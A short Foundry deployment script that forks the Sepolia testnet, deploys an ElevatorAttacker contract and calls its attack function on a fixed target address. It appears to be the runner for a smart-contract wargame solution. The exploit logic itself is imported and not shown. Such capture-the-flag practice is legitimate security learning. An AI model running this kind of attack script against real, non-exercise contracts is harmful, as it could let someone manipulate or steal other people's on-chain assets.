// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import {Script} from "forge-std/Script.sol";
import {ElevatorAttacker} from "../src/ElevatorAttacker.sol";

contract ElevatorAttackerScript is Script {
    function run() external {
        address targetAddress = 0x64cF6Ca8E70bBE0B4661B6Cc4Ad5313A9dE98d84;

        vm.createSelectFork(vm.envString("SEPOLIA_RPC_URL"));
        vm.startBroadcast(vm.envUint("SEPOLIA_PRIVATE_KEY"));

        ElevatorAttacker attacker = new ElevatorAttacker();
        attacker.attack(targetAddress);

        vm.stopBroadcast();
    }
}
